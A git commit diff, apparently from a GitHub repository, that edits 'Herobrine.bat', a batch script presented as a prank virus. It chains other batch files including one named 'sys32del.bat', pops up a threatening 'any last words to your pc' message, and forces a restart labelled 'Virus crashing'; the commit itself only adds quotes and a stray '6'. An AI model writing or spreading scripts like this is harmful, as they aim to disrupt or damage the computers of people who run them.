884bffb4d41c2927588d7141c2fa42336913dfd8
HerobrinePE <42194169+HerobrinePE@users.noreply.github.com>
2018-12-17 22:24:07 -0400

    Update Herobrine.bat

--- Herobrine.bat
+++ Herobrine.bat
@@ -7,6 +7,7 @@ File.bat
 hakk.bat
 Null.bat
 hsbthg836676hshjut^^^^^^^^²¹.bat
-msg * any last words to your pc because you didnt listen to my warning
+msg * "any last words to your pc because you didnt listen to my warning"
 sys32del.bat
 shutdown -r -t 180 -c "Virus crashing"
+6
